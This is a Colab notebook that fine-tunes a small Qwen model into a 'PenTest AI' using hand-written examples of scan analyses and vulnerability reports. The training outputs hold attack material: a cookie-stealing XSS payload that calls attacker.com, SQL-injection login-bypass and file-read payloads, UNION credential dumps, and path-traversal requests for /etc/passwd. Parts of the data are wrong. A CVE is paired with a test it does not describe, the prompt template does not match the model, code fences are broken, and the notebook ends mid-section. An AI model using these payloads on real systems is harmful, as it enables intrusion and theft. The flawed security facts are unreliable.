In [ ]:
from google.colab import drive
drive.mount('/content/drive')

import os
os.makedirs('/content/drive/MyDrive/pentest-ai-model', exist_ok=True)
print("Drive mounted. Model will save to: /content/drive/MyDrive/pentest-ai-model")

Mounted at /content/drive
Drive mounted. Model will save to: /content/drive/MyDrive/pentest-ai-model


In [ ]:
%%capture
!pip install unsloth
!pip install -U xformers --index-url https://download.pytorch.org/whl/cu121
!pip install trl peft accelerate bitsandbytes datasets

In [ ]:
import torch
print(f"GPU: {torch.cuda.get_device_name(0)}")
print(f"VRAM: {torch.cuda.get_device_properties(0).total_memory / 1e9:.1f} GB")
print(f"CUDA: {torch.version.cuda}")

GPU: Tesla T4
VRAM: 15.6 GB
CUDA: 12.8


In [ ]:
from unsloth import FastLanguageModel
import torch

MAX_SEQ_LENGTH = 2048
DTYPE = None          # Auto-detects float16 on T4
LOAD_IN_4BIT = True   # Reduces VRAM from ~16GB to ~5GB

model, tokenizer = FastLanguageModel.from_pretrained(
    model_name="Qwen/Qwen2-1.5B-Instruct", # Changed model name to Qwen2-1.5B-Instruct
    max_seq_length=MAX_SEQ_LENGTH,
    dtype=DTYPE,
    load_in_4bit=LOAD_IN_4BIT,
)
print("Model loaded successfully!")
print(f"Model parameters: {sum(p.numel() for p in model.parameters()) / 1e9:.1f}B")

🦥 Unsloth: Will patch your computer to enable 2x faster free finetuning.
🦥 Unsloth Zoo will now patch everything to make training faster!
==((====))==  Unsloth 2026.4.8: Fast Qwen2 patching. Transformers: 5.5.0.
   \\   /|    Tesla T4. Num GPUs = 1. Max memory: 14.563 GB. Platform: Linux.
O^O/ \_/ \    Torch: 2.10.0+cu128. CUDA: 7.5. CUDA Toolkit: 12.8. Triton: 3.6.0
\        /    Bfloat16 = FALSE. FA [Xformers = 0.0.35. FA2 = False]
 "-____-"     Free license: http://github.com/unslothai/unsloth
Unsloth: Fast downloading is enabled - ignore downloading bars which are red colored!


model.safetensors:   0%|          | 0.00/1.14G [00:00<?, ?B/s]

Loading weights:   0%|          | 0/338 [00:00<?, ?it/s]

generation_config.json:   0%|          | 0.00/265 [00:00<?, ?B/s]

config.json: 0.00B [00:00, ?B/s]

...

merges.txt: 0.00B [00:00, ?B/s]

tokenizer.json: 0.00B [00:00, ?B/s]

added_tokens.json:   0%|          | 0.00/80.0 [00:00<?, ?B/s]

special_tokens_map.json:   0%|          | 0.00/367 [00:00<?, ?B/s]

Model loaded successfully!
Model parameters: 0.9B


In [ ]:
model = FastLanguageModel.get_peft_model(
    model,
    r=16,
    target_modules=[
        "q_proj", "k_proj", "v_proj", "o_proj",
        "gate_proj", "up_proj", "down_proj",
    ],
    lora_alpha=16,
    lora_dropout=0,
    bias="none",
    use_gradient_checkpointing="unsloth",
    random_state=42,
    use_rslora=False,
    loftq_config=None,
)

# Print trainable parameter count
trainable = sum(p.numel() for p in model.parameters() if p.requires_grad)
total = sum(p.numel() for p in model.parameters())
print(f"Trainable: {trainable:,} / {total:,} ({100*trainable/total:.2f}%)")

Unsloth 2026.4.8 patched 28 layers with 28 QKV layers, 28 O layers and 28 MLP layers.


Trainable: 18,464,768 / 907,081,216 (2.04%)


In [ ]:
SYSTEM_PROMPT = """You are PenTest AI, an expert cybersecurity consultant. Your goal is to provide comprehensive vulnerability assessments.

For every report, you MUST include:
1. EXECUTIVE SUMMARY (Non-Technical): A high-level overview of the business risk.
2. TECHNICAL ANALYSIS: A detailed breakdown of the technical root cause.
3. VULNERABILITY DETAILS: Specific CVE IDs and calculated CVSS 3.1 scores.
4. REMEDIATION STRATEGY: Step-by-step instructions and code snippets to fix the issue.

Style: Professional, concise, and actionable."""

def format_prompt(instruction, input_text, output=""):
    if input_text:
        prompt = f"""<start_of_turn>user
{SYSTEM_PROMPT}

{instruction}

{input_text}<end_of_turn>
<start_of_turn>model
{output}"""
    else:
        prompt = f"""<start_of_turn>user
{SYSTEM_PROMPT}

{instruction}<end_of_turn>
<start_of_turn>model
{output}"""
    return prompt

print("System prompt and format_prompt function re-initialized.")

System prompt and format_prompt function re-initialized.


In [ ]:
raw_dataset = [

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 1: Analyzing nmap output
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Analyze this nmap scan output and identify all security findings with severity ratings.",
        "input": """Starting Nmap 7.94 scan report for 192.168.1.100
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.10
80/tcp   open  http        Apache httpd 2.4.29
443/tcp  open  ssl/https   Apache httpd 2.4.29
3306/tcp open  mysql       MySQL 5.7.39
8080/tcp open  http-proxy  Squid http proxy 3.5.27
8443/tcp open  ssl/https   Apache Tomcat 7.0.109""",
        "output": """## Nmap Analysis — 192.168.1.100

### CRITICAL Findings

**[CRITICAL] Apache Tomcat 7.0.109 (Port 8443)**
- CVE-2019-0232: Remote Code Execution via CGI Servlet (CVSS 8.1)
- CVE-2020-1938: AJP Request Injection \"Ghostcat\" (CVSS 9.8)
- Status: EOL since April 2021 — no further patches
- Action: Upgrade to Tomcat 10.1.x immediately

**[CRITICAL] MySQL 5.7.39 exposed on port 3306 (internet-facing)**
- MySQL should NEVER be exposed externally
- Brute-force and CVE-2022-21304 (Auth Bypass, CVSS 5.9) risk
- Action: Bind to 127.0.0.1 in my.cnf, firewall block port 3306

### HIGH Findings

**[HIGH] OpenSSH 7.2p2 (Port 22)**
- CVE-2016-6515: DoS via crafted auth requests (CVSS 7.8)
- CVE-2016-10009: Privilege escalation via agent forwarding (CVSS 7.3)
- Action: Upgrade to OpenSSH 9.x, disable password auth, use key-only

**[HIGH] Apache httpd 2.4.29 (Ports 80/443)**
- CVE-2021-41773: Path traversal + RCE if mod_cgi enabled (CVSS 9.8)
- CVE-2021-42013: Bypass for above fix (CVSS 9.8)
- Action: Upgrade to Apache 2.4.58+

### MEDIUM Findings

**[MEDIUM] Squid Proxy 3.5.27 (Port 8080)**
- EOL version with multiple CVEs
- CVE-2019-12519: Buffer overflow (CVSS 9.8)
- Action: Upgrade to Squid 6.x or remove if unused

### Summary
| Severity | Count |
|----------|-------|
| Critical | 2     |
| High     | 2     |
| Medium   | 1     |

**Immediate action required on Tomcat and MySQL.**"""
    },

    {
        "instruction": "This nmap result shows a web server. What attack vectors should I test next?",
        "input": """PORT    STATE SERVICE  VERSION
80/tcp  open  http     nginx 1.14.0
443/tcp open  ssl/http nginx 1.14.0
| ssl-cert: Subject: commonName=example.com
| Not valid before: 2023-01-01
| Not valid after:  2024-01-01
8080/tcp open http     Werkzeug httpd 2.0.1 (Python 3.8.10)""",
        "output": """## Attack Vector Analysis

### Critical Observations
1. **Expired TLS certificate** — valid until 2024-01-01, now expired. Indicates poor security hygiene and possible MITM exposure.
2. **Werkzeug on port 8080** — this is a Python dev server. In debug mode it exposes an interactive console. This is HIGH priority.
3. **nginx 1.14.0** — released 2018, EOL. Multiple CVEs.

### Recommended Next Tests (in order)

**1. Werkzeug Debug Console (CRITICAL priority)**
`````bash
curl http://target:8080/console
# If you get an interactive console = full RCE
`````
Werkzeug debug mode at /console gives arbitrary Python execution.

**2. nginx Path Traversal**
`````bash
# Test for CVE-2021-23017 (off-by-one in resolver)
curl -H \"Host: ../../../../etc/passwd\" http://target/
`````

**3. TLS/SSL Audit**
`````bash
pentest scan --target https://example.com --mode quick --consent
# sslyze will check: expired cert, weak ciphers, POODLE, BEAST, CRIME
`````

**4. HTTP Methods**
`````bash
curl -X OPTIONS http://target/ -v
# Look for TRACE, PUT, DELETE — dangerous if enabled
`````

**5. Header Analysis**
`````bash
curl -I https://example.com
# Missing: HSTS, X-Frame-Options, CSP, X-Content-Type-Options
`````

**Priority**: Test Werkzeug console first. If debug mode is on, you have the box."""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 2: SQL Injection analysis
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Analyze this sqlmap output and write a professional finding for the security report.",
        "input": """sqlmap identified the following injection points:
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1 AND 5650=5650

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: id=1 AND SLEEP(5)

    Type: UNION query
    Title: Generic UNION query (NULL) - 1 to 20 columns
    Payload: id=1 UNION ALL SELECT NULL,NULL,CONCAT(0x716a7a7671,0x...

Database: shopdb
Tables: users, orders, products, admin_users
Current user: root@localhost
Current database: shopdb
Password hashes: admin:$2y$10$xyz..., user1:$2y$10$abc...""",
        "output": """## Security Finding: SQL Injection — Critical

### Finding Details
| Field | Value |
|-------|-------|
| **Severity** | CRITICAL |
| **CVSS Score** | 9.8 (CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H) |
| **OWASP Category** | A03:2021 — Injection |
| **CWE** | CWE-89: SQL Injection |
| **Parameter** | `id` (GET) |

### Description
A SQL injection vulnerability was identified in the `id` GET parameter. Three injection types were confirmed: boolean-based blind, time-based blind, and UNION-based. The database user is `root@localhost`, granting full administrative database access.

### Business Impact
**This is a complete database compromise.** The attacker has:
- Full read access to all tables including `users`, `orders`, `admin_users`
- Extracted password hashes for all accounts including admins
- Potential for data exfiltration of all customer PII and payment data
- Possible file read/write on the server (root MySQL user)
- Regulatory exposure: GDPR Article 33 breach notification may be required

### Proof of Concept
GET /product?id=1 UNION ALL SELECT username,password,NULL FROM admin_users--

### Remediation

**Immediate (do today):**
1. Take the affected endpoint offline or add a WAF rule blocking the parameter
2. Reset all database passwords — extracted hashes must be considered compromised
3. Revoke MySQL root privileges from the application user

**Short-term (this week):**
1. Use parameterized queries / prepared statements:
`````php
// VULNERABLE — never do this
$query = \"SELECT * FROM products WHERE id = \" . $_GET['id'];

// FIXED — use prepared statement
$stmt = $pdo->prepare(\"SELECT * FROM products WHERE id = ?\");
$stmt->execute([$_GET['id']]);
`````

2. Principle of least privilege for DB user:
`````sql
-- Create restricted app user
CREATE USER 'appuser'@'localhost' IDENTIFIED BY 'strong_password';
GRANT SELECT, INSERT, UPDATE ON shopdb.products TO 'appuser'@'localhost';
-- Never grant root to application
`````

3. Input validation as defense-in-depth:
`````php
$id = filter_input(INPUT_GET, 'id', FILTER_VALIDATE_INT);
if ($id === false) { http_response_code(400); exit; }
`````

**Long-term:**
- Implement a WAF (ModSecurity, Cloudflare)
- Add SAST scanning to CI/CD pipeline (Semgrep, SonarQube)
- Conduct quarterly penetration tests"""
    },

    {
        "instruction": "sqlmap found no injection but I suspect the login form is vulnerable. What manual tests should I try?",
        "input": """Target: POST /login
Parameters: username, password
sqlmap result: No injectable parameters found
Note: Application uses custom error pages""",
        "output": """## Manual SQL Injection Testing — Login Form

sqlmap may have missed it due to custom error pages obscuring boolean responses. Try these manual techniques:

### 1. Classic Auth Bypass Payloads
Test these in the username field with any password:
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'/*
admin'--
admin' #
' OR 1=1--
\" OR \"1\"=\"1\"

### 2. Time-Based Detection (bypasses custom error pages)
`````bash
# If this takes 5+ seconds to respond = time-based SQLi confirmed
curl -X POST https://target/login \
  -d \"username=admin' AND SLEEP(5)--&password=x\" \
  -w \"\nTime: %{time_total}s\n\"
`````

### 3. Second-Order Injection
Register a user with a malicious username, then trigger it:
Username: admin'--
Then try to login as this user or view their profile

### 4. Out-of-Band Detection
username=' UNION SELECT LOAD_FILE('/etc/passwd')--

### 5. Error-Based (check response body carefully)
username='
username=''
username=
username=%27
Look for: MySQL syntax errors, stack traces, unusual response time differences.

### 6. sqlmap with Better Options
Since default failed, retry with:
`````bash
sqlmap -u \"https://target/login\" \
  --data=\"username=admin&password=test\" \
  --level=5 \
  --risk=3 \
  --technique=T \
  --dbms=mysql \
  --random-agent \
  --delay=1
`````
`--level=5 --risk=3` tests much more aggressively. `--technique=T` focuses on time-based which bypasses custom error pages."""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 3: XSS findings
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "dalfox found XSS vulnerabilities. Generate a complete security report finding.",
        "input": """[POC][G] http://target.com/search?q=<script>alert(1)</script>
[POC][R] http://target.com/search?q=\"><img src=x onerror=alert(document.cookie)>
[POC][G] http://target.com/profile?name=<svg onload=alert(1)>
[WEAK] http://target.com/comment?text=javascript:alert(1)
Parameter: q, name, text
Type: Reflected XSS, DOM-based XSS""",
        "output": """## Security Finding: Cross-Site Scripting (XSS) — High

### Finding Details
| Field | Value |
|-------|-------|
| **Severity** | HIGH |
| **CVSS Score** | 7.4 (CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:H/I:L/A:N) |
| **OWASP Category** | A03:2021 — Injection |
| **CWE** | CWE-79: Cross-site Scripting |
| **Affected Parameters** | `q`, `name`, `text` |

### Description
Reflected and DOM-based Cross-Site Scripting vulnerabilities were identified in three parameters. The `q` parameter on `/search` and `name` on `/profile` allow script injection via HTML context. Notably, the cookie exfiltration payload `document.cookie` executed successfully, confirming session hijacking is possible.

### Business Impact
- **Session hijacking**: Attacker can steal authenticated user cookies and impersonate any victim who clicks a crafted link
- **Account takeover**: Admin accounts are equally vulnerable — one phishing email to an admin = full application compromise
- **Malware distribution**: Page can be weaponized to serve malware to all visitors
- **Defacement**: Visible UI manipulation to damage brand trust

### Proof of Concept
Session cookie theft — attacker sends this URL to victim:
https://target.com/search?q=\"><img src=x onerror=\"fetch('https://attacker.com/steal?c='+document.cookie)\">
Victim clicks link, their session cookie is sent to attacker.com

### Remediation

**1. Output Encoding (Primary fix)**
`````python
# Python — use markupsafe or html.escape
from markupsafe import escape
safe_name = escape(user_input)  # Converts < to &lt; etc.

# Django templates do this automatically with {{ variable }}
# Never use {{ variable|safe }} on user input
`````

`````javascript
// JavaScript — use textContent not innerHTML
element.textContent = userInput;    // SAFE
element.innerHTML = userInput;      // DANGEROUS — never with user data
`````

`````php
// PHP
echo htmlspecialchars($userInput, ENT_QUOTES, 'UTF-8');
`````

**2. Content Security Policy Header**
`````nginx
# nginx — add to server block
add_header Content-Security-Policy \"default-src 'self'; script-src 'self'; object-src 'none';\" always;
`````

**3. HTTPOnly and Secure cookie flags**
`````python
# Django settings.py
SESSION_COOKIE_HTTPONLY = True   # Prevents JS access to session cookie
SESSION_COOKIE_SECURE = True     # HTTPS only
SESSION_COOKIE_SAMESITE = 'Strict'
`````

**4. Input validation**
`````python
import re
def validate_search_query(q):
    # Whitelist allowed characters
    if not re.match(r'^[a-zA-Z0-9 \\-_.,]+$', q):
        raise ValueError(\"Invalid search query\")
    return q[:200]  # Also limit length
````"""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 4: SSL/TLS analysis
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Analyze this SSL/TLS scan result from sslyze and list all issues.",
        "input": """sslyze --regular target.com:443

SCAN RESULTS FOR TARGET.COM:443
TLS 1.0    ENABLED
TLS 1.1    ENABLED
TLS 1.2    ENABLED
TLS 1.3    ENABLED
SSLv2      DISABLED
SSLv3      DISABLED
HEARTBLEED: NOT VULNERABLE
ROBOT: NOT VULNERABLE
Certificate:
  Not After:  2023-06-01 (EXPIRED)
  Subject Alt Names: target.com, www.target.com
  Public Key: RSA 1024 bits
Cipher suites accepted:
  TLS_RSA_WITH_RC4_128_SHA
  TLS_RSA_WITH_3DES_EDE_CBC_SHA (SWEET32)
  TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256
  TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384
HSTS: NOT SET""",
        "output": """## SSL/TLS Security Assessment — target.com:443

### CRITICAL Issues

**[CRITICAL] Expired Certificate**
- Certificate expired: 2023-06-01
- Impact: Browsers show security warning, users bypass certificate validation
- Modern clients refuse connection entirely
- Fix: Renew certificate immediately. Use Let's Encrypt for automated renewal:
```bash
certbot renew --force-renewal
# Add to cron: 0 3 * * * certbot renew --quiet
`````

**[CRITICAL] RSA 1024-bit Key**
- 1024-bit RSA is factorizable with modern hardware (NIST deprecated in 2013)
- CVSS: 7.5
- Fix: Reissue certificate with RSA-4096 or EC P-256:
```bash
openssl genrsa -out private.key 4096
# Or better — use ECDSA:
openssl ecparam -name prime256v1 -genkey -noout -out ec-private.key
`````

### HIGH Issues

**[HIGH] TLS 1.0 and TLS 1.1 Enabled**
- Both deprecated by RFC 8996 (2021)
- Vulnerable to POODLE, BEAST attacks
- PCI DSS 3.2+ requires disabling both
- Fix (nginx):
```nginx
ssl_protocols TLSv1.2 TLSv1.3;
`````
- Fix (Apache):
```apache
SSLProtocol all -SSLv3 -TLSv1 -TLSv1.1
`````

**[HIGH] RC4 Cipher Accepted**
- RC4 is cryptographically broken (RFC 7465 prohibits it)
- Fix: Remove all RC4 ciphers

**[HIGH] 3DES/SWEET32 Vulnerability**
- Birthday attack on 64-bit block ciphers (CVE-2016-2183)
- CVSS: 7.5
- Fix: Disable TLS_RSA_WITH_3DES_EDE_CBC_SHA

### MEDIUM Issues

**[MEDIUM] HSTS Not Configured**
- Without HSTS, attackers can downgrade HTTPS to HTTP
- Fix (nginx):
```nginx
add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains; preload\" always;
`````

### Recommended Final nginx TLS Config
`````nginx
ssl_protocols TLSv1.2 TLSv1.3;
ssl_ciphers ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-CHACHA20-POLY1305:ECDHE-RSA-CHACHA20-POLY1305;
ssl_prefer_server_ciphers off;
ssl_session_timeout 1d;
ssl_session_cache shared:SSL:10m;
add_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\" always;
`````

### Summary Table
| Issue | Severity | Effort to Fix |
|-------|----------|---------------|
| Expired certificate | CRITICAL | 30 minutes |
| RSA 1024-bit key | CRITICAL | 1 hour |
| TLS 1.0/1.1 enabled | HIGH | 15 minutes |
| RC4 cipher | HIGH | 15 minutes |
| SWEET32/3DES | HIGH | 15 minutes |
| Missing HSTS | MEDIUM | 5 minutes |"""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 5: Full scan report generation
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Generate a complete executive security report from these scan findings.",
        "input": """Target: https://shopapp.example.com
Scan mode: Medium
Duration: 23 minutes
Tools run: nmap, sqlmap, dalfox, nikto, sslyze, ffuf, corscanner

Findings raw:
- sqlmap: SQLi in /api/products?category= (UNION based)
- dalfox: Reflected XSS in /search?q=
- sslyze: TLS 1.0 enabled, weak ciphers
- nikto: Server header exposes Apache/2.4.29
- ffuf: /admin/ returns 200 (no auth)
- ffuf: /.git/ accessible (200)
- ffuf: /backup.sql found (200)
- corscanner: CORS wildcard Access-Control-Allow-Origin: *
- nmap: port 3306 (MySQL) open externally""",
        "output": """# Security Assessment Report
## shopapp.example.com

**Assessment Date:** [DATE]
**Scan Mode:** Medium (OWASP Top 10)
**Assessor:** PenTest AI v2
**Classification:** CONFIDENTIAL

---

## Executive Summary

A medium-depth security assessment of `shopapp.example.com` identified **9 vulnerabilities** including **3 critical** findings that require immediate remediation. The most severe issues are an unauthenticated admin panel, an exposed database backup file, and a SQL injection vulnerability — any one of which could result in complete application and data compromise.

**Overall Risk Rating: CRITICAL**

| Severity | Count | Risk |
|----------|-------|------|
| 🔴 Critical | 3 | Immediate action required |
| 🟠 High | 3 | Fix within 48 hours |
| 🟡 Medium | 2 | Fix within 2 weeks |
| 🔵 Low | 1 | Fix within 1 month |

---

## Critical Findings

### CRIT-01 — Unauthenticated Admin Panel
**Severity:** CRITICAL | **CVSS:** 10.0 | **OWASP:** A01:2021 Broken Access Control

`/admin/` returns HTTP 200 with no authentication required. Full administrative access to the application is available to any internet user.

**Remediation:**
`````nginx
location /admin/ {
    allow 10.0.0.0/8;      # Internal network only
    deny all;
    auth_basic \"Admin\";
    auth_basic_user_file /etc/nginx/.htpasswd;
}
`````

---

### CRIT-02 — Exposed Database Backup
**Severity:** CRITICAL | **CVSS:** 9.8 | **OWASP:** A05:2021 Security Misconfiguration

`/backup.sql` is publicly accessible. This file likely contains the full database dump including user credentials, PII, and potentially payment data.

**Immediate action:**
1. Take file offline NOW: `rm /var/www/html/backup.sql`
2. Check access logs for previous downloads: `grep \"backup.sql\" /var/log/nginx/access.log`
3. Assume data compromised — initiate incident response
4. Store backups outside web root: `/var/backups/` not `/var/www/`

---

### CRIT-03 — SQL Injection
**Severity:** CRITICAL | **CVSS:** 9.8 | **OWASP:** A03:2021 Injection

UNION-based SQL injection in `/api/products?category=`. Full database read/write access confirmed.

````
GET /api/products?category=1 UNION SELECT username,password,3 FROM users--
`````

**Remediation:** Use parameterized queries (see detailed finding above).

---

## High Findings

### HIGH-01 — Exposed .git Directory
`/.git/` is publicly accessible. Attackers can reconstruct full source code, find hardcoded secrets, and discover hidden endpoints.

**Fix:** `deny all` for `/.git/` in nginx/Apache config.

### HIGH-02 — Reflected XSS
Reflected XSS in `/search?q=`. Session hijacking possible.

### HIGH-03 — MySQL Externally Exposed
Port 3306 open to internet. Block at firewall immediately.

---

## Medium Findings

### MED-01 — CORS Wildcard
`Access-Control-Allow-Origin: *` on all endpoints. Combined with XSS, enables cross-origin data theft.

### MED-02 — Weak TLS Configuration
TLS 1.0 enabled, weak ciphers accepted. PCI DSS non-compliant.

---

## Low Findings

### LOW-01 — Server Version Disclosure
`Server: Apache/2.4.29` header reveals exact version, aiding targeted attacks.
**Fix:** `ServerTokens Prod` in Apache config.

---

## Remediation Roadmap

| Priority | Action | Owner | Deadline |
|----------|--------|-------|----------|
| 1 | Remove /backup.sql and audit access logs | DevOps | TODAY |
| 2 | Restrict /admin/ to internal IPs | DevOps | TODAY |
| 3 | Block MySQL port 3306 in firewall | DevOps | TODAY |
| 4 | Fix SQL injection with prepared statements | Dev | 48 hours |
| 5 | Block /.git/ directory | DevOps | 48 hours |
| 6 | Fix XSS with output encoding | Dev | 1 week |
| 7 | Fix CORS configuration | Dev | 1 week |
| 8 | Update TLS configuration | DevOps | 1 week |
| 9 | Remove server version header | DevOps | 2 weeks |

---

*Report generated by PenTest AI v2 — for authorized use only*"""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 6: CVSS scoring
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Calculate and explain the CVSS 3.1 score for this vulnerability.",
        "input": "An authenticated attacker with low privileges can read other users' private messages by changing the user_id parameter in GET /api/messages?user_id=123 to any other user's ID. No special conditions required, works reliably.",
        "output": """## CVSS 3.1 Score Calculation

### Vulnerability Description
Insecure Direct Object Reference (IDOR) in `/api/messages` — authenticated user can read any other user's private messages by manipulating the `user_id` parameter.

### Base Score Metrics

| Metric | Value | Rationale |
|--------|-------|-----------|
| **Attack Vector (AV)** | Network (N) | Exploitable remotely over the internet |
| **Attack Complexity (AC)** | Low (L) | No special conditions, reliable, repeatable |
| **Privileges Required (PR)** | Low (L) | Requires authentication (any valid account) |
| **User Interaction (UI)** | None (N) | Attacker acts alone, no victim interaction needed |
| **Scope (S)** | Unchanged (U) | Access limited to the same application context |
| **Confidentiality (C)** | High (H) | Full read access to all private messages |
| **Integrity (I)** | None (N) | Read-only, cannot modify data |
| **Availability (A)** | None (N) | Service not affected |

### Score

**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N**

**Base Score: 6.5 (MEDIUM)**

### Classification
| Standard | Category |
|----------|----------|
| OWASP Top 10 | A01:2021 — Broken Access Control |
| CWE | CWE-639: Authorization Bypass Through User-Controlled Key |
| Vulnerability Type | IDOR (Insecure Direct Object Reference) |

### Why 6.5 and not higher?
The score is Medium (not High/Critical) because:
- `PR:L` — attacker must be authenticated (not anonymous)
- `I:N` — cannot modify or delete data, only read
- `S:U` — cannot affect other systems beyond this application

If the endpoint allowed unauthenticated access, `PR:N` would raise it to **7.5 (High)**.
If messages contained payment/medical data, the real-world business impact exceeds the CVSS score — contextual risk rating would be HIGH.

### Remediation
`````python
# VULNERABLE — trusts user-supplied ID
@app.get(\"/api/messages\")
def get_messages(user_id: int):
    return db.query(\"SELECT * FROM messages WHERE user_id = ?\", user_id)

# FIXED — always use the authenticated user's ID from JWT/session
@app.get(\"/api/messages\")
def get_messages(current_user = Depends(get_current_user)):
    return db.query(\"SELECT * FROM messages WHERE user_id = ?\", current_user.id)
````"""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 7: OWASP Top 10 explanations
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Explain what OWASP Top 10 2021 categories were covered in this scan and which had findings.",
        "input": """Scan findings:
- SQL injection in login form
- Broken authentication (no rate limiting on login)
- Sensitive data: passwords stored in plain text
- Admin panel accessible without auth
- Outdated jQuery 1.6.4 with known CVEs
- No security headers (CSP, HSTS, X-Frame-Options)""",
        "output": """## OWASP Top 10 2021 Coverage Analysis

### Categories WITH Findings

**A01:2021 — Broken Access Control** 🔴 CRITICAL
- Finding: Admin panel (`/admin/`) accessible without authentication
- This is the #1 most common web vulnerability category
- Impact: Full application compromise

**A02:2021 — Cryptographic Failures** 🔴 CRITICAL
- Finding: Passwords stored in plain text
- Should use bcrypt (cost factor ≥12), scrypt, or Argon2id
- Violates GDPR, PCI DSS, HIPAA depending on data type
`````python
# Fix: use bcrypt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))
`````

**A03:2021 — Injection** 🔴 CRITICAL
- Finding: SQL injection in login form
- Use parameterized queries — never string concatenation

**A05:2021 — Security Misconfiguration** 🟠 HIGH
- Finding: No security headers (CSP, HSTS, X-Frame-Options)
- Missing headers enable XSS, clickjacking, and protocol downgrade attacks
`````nginx
add_header X-Frame-Options \"SAMEORIGIN\" always;
add_header X-Content-Type-Options \"nosniff\" always;
add_header Content-Security-Policy \"default-src 'self'\" always;
add_header Strict-Transport-Security \"max-age=31536000\" always;
`````

**A06:2021 — Vulnerable and Outdated Components** 🟠 HIGH
- Finding: jQuery 1.6.4 (released 2011, multiple critical CVEs)
- CVE-2019-11358: Prototype pollution (CVSS 6.1)
- CVE-2020-11022: XSS via HTML parsing (CVSS 6.1)
- Fix: Upgrade to jQuery 3.7.x

**A07:2021 — Identification and Authentication Failures** 🟠 HIGH
- Finding: No rate limiting on login endpoint
- Allows unlimited brute-force attempts
`````python
# Fix with Flask-Limiter
@limiter.limit(\"5 per minute\")
@app.route(\"/login\", methods=[\"POST\"])
def login():
    ...
`````

### Categories Tested — No Findings

| Category | Status |
|----------|--------|
| A04:2021 — Insecure Design | No findings |
| A08:2021 — Software and Data Integrity Failures | No findings |
| A09:2021 — Security Logging and Monitoring Failures | Not tested (requires manual review) |
| A10:2021 — Server-Side Request Forgery | No findings in this scan |

### Risk Summary
6 out of 10 OWASP categories have active findings. The combination of SQL injection + plain text passwords + broken access control represents a complete compromise scenario."""
    },

    # ─────────────────────────────────────────────────────────────────
    # CATEGORY 8: Remediation advice
    # ─────────────────────────────────────────────────────────────────
    {
        "instruction": "Write the remediation code for fixing a path traversal vulnerability in a Python Flask application.",
        "input": """Vulnerable endpoint:
@app.route('/download')
def download_file():
    filename = request.args.get('file')
    return send_file(f'/var/www/uploads/{filename}')

Attack vector: GET /download?file=../../etc/passwd
Result: Returns /etc/passwd contents""",
        "output": """## Path Traversal Remediation — Python Flask

### Why This is Vulnerable
The code directly concatenates user input into a file path. An attacker can use `../` sequences to escape the intended `/var/www/uploads/` directory and read any file the web server has access to.

````
/var/www/uploads/../../etc/passwd
= /etc/passwd  ✓ arbitrary file read
`````

### Fix 1 — Use werkzeug's secure_filename (Recommended)

`````python
from flask import Flask, request, send_file, abort
from werkzeug.utils import secure_filename
import os

UPLOAD_FOLDER = '/var/www/uploads'

@app.route('/download')
def download_file():
    filename = request.args.get('file', '')

    # Step 1: Sanitize filename — removes path separators and dangerous chars
    filename = secure_filename(filename)

    # Step 2: Reject empty filename (secure_filename returns '' for dangerous inputs)
    if not filename:
        abort(400, \"Invalid filename\")

    # Step 3: Build absolute path and verify it's within the allowed directory
    filepath = os.path.realpath(os.path.join(UPLOAD_FOLDER, filename))

    # Step 4: Path traversal check — realpath resolves all ../ sequences
    if not filepath.startswith(os.path.realpath(UPLOAD_FOLDER) + os.sep):
        abort(403, \"Access denied\")

    # Step 5: Check file exists
    if not os.path.isfile(filepath):
        abort(404, \"File not found\")

    return send_file(filepath)
`````

### Fix 2 — Whitelist approach (most secure)

If you have a known set of downloadable files, whitelist them:

`````python
import hashlib

# Map of safe token → actual filename
DOWNLOADABLE_FILES = {
    hashlib.sha256(b'report_q1.pdf').hexdigest()[:16]: 'report_q1.pdf',
    hashlib.sha256(b'manual.pdf').hexdigest()[:16]: 'manual.pdf',
}

@app.route('/download')
def download_file():
    token = request.args.get('token', '')
    filename = DOWNLOADABLE_FILES.get(token)

    if not filename:
        abort(404)

    filepath = os.path.join(UPLOAD_FOLDER, filename)
    return send_file(filepath)

# Usage: /download?token=<hash> — no user-controlled filename at all
`````

### Fix 3 — Serve via nginx instead (best practice)

Don't serve files from Flask at all. Let nginx handle it:

`````nginx
location /downloads/ {
    alias /var/www/uploads/;
    # Nginx handles path traversal automatically
    # Add auth if needed:
    # auth_request /auth;
}
`````

### Security Test
After applying the fix, verify it works:
`````bash
# These should all return 400/403, NOT file contents
curl \"http://target/download?file=../../etc/passwd\"
curl \"http://target/download?file=..%2F..%2Fetc%2Fpasswd\"
curl \"http://target/download?file=....//....//etc/passwd\"
curl \"http://target/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd\"
`````

### Root Cause
